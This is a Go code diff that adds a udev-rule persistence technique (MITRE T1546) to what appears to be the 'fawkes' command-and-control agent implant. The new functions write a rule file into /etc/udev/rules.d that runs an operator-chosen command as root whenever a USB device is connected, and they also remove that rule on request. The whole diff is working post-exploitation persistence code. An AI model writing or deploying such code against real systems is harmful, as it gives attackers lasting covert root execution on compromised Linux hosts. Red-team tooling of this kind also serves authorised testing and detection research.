@@ -538,6 +538,81 @@ func persistAPTHookRemove(args persistArgs) structs.CommandResult {
 	return successf("Removed APT hook persistence: %s", hookPath)
 }
 
+// persistUdevRule installs/removes a udev rule in /etc/udev/rules.d/ that triggers
+// on device events (T1546). Rules run as root when matching devices are plugged in,
+// or on systemd-based systems, on startup via udevadm trigger.
+func persistUdevRule(args persistArgs) structs.CommandResult {
+	switch args.Action {
+	case "install":
+		return persistUdevRuleInstall(args)
+	case "remove":
+		return persistUdevRuleRemove(args)
+	default:
+		return errorf("Unknown action: %s. Use: install, remove", args.Action)
+	}
+}
+
+func persistUdevRuleInstall(args persistArgs) structs.CommandResult {
+	if args.Path == "" {
+		return errorResult("Error: path (command to execute on device event) is required")
+	}
+
+	name := "99-fawkes.rules"
+	if args.Name != "" {
+		if !strings.HasSuffix(args.Name, ".rules") {
+			name = args.Name + ".rules"
+		} else {
+			name = args.Name
+		}
+	}
+
+	udevDir := "/etc/udev/rules.d"
+	if _, err := os.Stat(udevDir); os.IsNotExist(err) {
+		return errorf("Directory %s does not exist — udev not available on this system", udevDir)
+	}
+
+	rulePath := filepath.Join(udevDir, name)
+	if _, err := os.Stat(rulePath); err == nil {
+		return errorf("Udev rule already exists: %s. Remove first.", rulePath)
+	}
+
+	// ACTION=="add" triggers on any device add (common: USB, network, etc.)
+	// RUN+= executes the command as root
+	content := fmt.Sprintf(`# fawkes-persist: %s
+ACTION=="add", SUBSYSTEM=="usb", RUN+="%s"
+`, name, args.Path)
+
+	if err := os.WriteFile(rulePath, []byte(content), 0644); err != nil {
+		return errorf("Failed to write %s: %v (requires root)", rulePath, err)
+	}
+
+	return successf("Udev rule persistence installed:\n  File: %s\n  Command: %s\n  Trigger: Runs as root when USB device is connected\n  Note: Run 'udevadm control --reload-rules' to activate immediately\n\nRemove with: persist -method udev-rule -action remove -name %s", rulePath, args.Path, name)
+}
+
+func persistUdevRuleRemove(args persistArgs) structs.CommandResult {
+	name := "99-fawkes.rules"
+	if args.Name != "" {
+		if !strings.HasSuffix(args.Name, ".rules") {
+			name = args.Name + ".rules"
+		} else {
+			name = args.Name
+		}
+	}
+
+	rulePath := filepath.Join("/etc/udev/rules.d", name)
+	if _, err := os.Stat(rulePath); err != nil {
+		return errorf("Udev rule not found: %s", rulePath)
+	}
+
+	secureRemove(rulePath)
+
+	if _, err := os.Stat(rulePath); err == nil {
+		return errorf("Failed to remove %s: file still exists", rulePath)
+	}
+
+	return successf("Removed udev rule persistence: %s", rulePath)
+}
+
 // persistLinuxList lists all installed persistence methods
 func persistLinuxList() structs.CommandResult {
 	var sb strings.Builder
